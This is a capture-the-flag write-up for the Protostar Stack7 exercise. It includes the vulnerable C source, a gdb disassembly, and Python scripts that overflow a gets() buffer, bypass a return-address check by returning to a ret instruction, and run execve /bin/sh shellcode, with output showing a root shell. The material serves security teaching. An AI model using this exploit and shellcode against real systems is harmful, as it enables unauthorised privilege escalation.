# PROTOSTAR : STACK 7
[Protostar:Stack7](https://exploit.education/protostar/stack-seven/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Stack Buffer Overflow

Same as the previous level the **main()** calls **getpath()** where **buffer** variable is and **gets** which is vulnerable to Buffer Overflow takes **buffer** as input. **Stack Address Restriction** is applied in the program so we need to bypass it by returning to the function itself.

### **SOLUTION**
Below is the disassembly of the **getpath()** function.
```
user@protostar:/tmp$ gdb -q /opt/protostar/bin/stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) set disassembly-flavor intel
(gdb) disass getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>: push   ebp
0x080484c5 <getpath+1>: mov    ebp,esp
0x080484c7 <getpath+3>: sub    esp,0x68
0x080484ca <getpath+6>: mov    eax,0x8048620
0x080484cf <getpath+11>:        mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:        call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:        mov    eax,ds:0x8049780
0x080484dc <getpath+24>:        mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:        call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:        lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:        mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:        call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:        mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:        mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:        mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:        and    eax,0xb0000000
0x080484fd <getpath+57>:        cmp    eax,0xb0000000
0x08048502 <getpath+62>:        jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:        mov    eax,0x8048634
0x08048509 <getpath+69>:        mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:        mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:        mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:        call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:        mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:        call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:        mov    eax,0x8048640
0x08048529 <getpath+101>:       lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:       mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:       mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:       call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:       lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:       mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:       call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:       leave  
0x08048544 <getpath+128>:       ret    
End of assembler dump.
(gdb) 
```
### **PYTHON SCRIPT**

```py
import struct
padding = "A"*80

ret = struct.pack("I",0x08048544)

print(padding + ret)
```

Executing the above script, you see I hit Breakpoint 1 once again because stack popped the **getpath()** address and returned to the function itself.

```
(gdb) b *0x08048544
Breakpoint 1 at 0x8048544: file stack7/stack7.c, line 24.
(gdb) r < ./exploit
Starting program: /opt/protostar/bin/stack7 < ./exploit
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD�

Breakpoint 1, 0x08048544 in getpath () at stack7/stack7.c:24
24      stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) x/4x $esp
0xbffff7ac:     0x08048544      0x08048500      0x00000000      0xbffff838
(gdb) si

Breakpoint 1, 0x08048544 in getpath () at stack7/stack7.c:24
24      in stack7/stack7.c
(gdb) 
```

Let's add some nop sleds and our shellcode and write our python exploit script and execute it to get the ROOT SHELL.

Below is the python script I am going to execute
```py
import struct
padding = "A"*80

ret = struct.pack("I",0x08048544)

eip = struct.pack("I",0xbffff7b0+20)

nop = "\x90"*100

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

print(padding + ret + eip + nop + shellcode)
```

After executing the exploit code we get the root shell.
```user@protostar:/tmp$ (python exploit.py; cat) | /opt/protostar/bin/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD��������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���

whoami
root


```

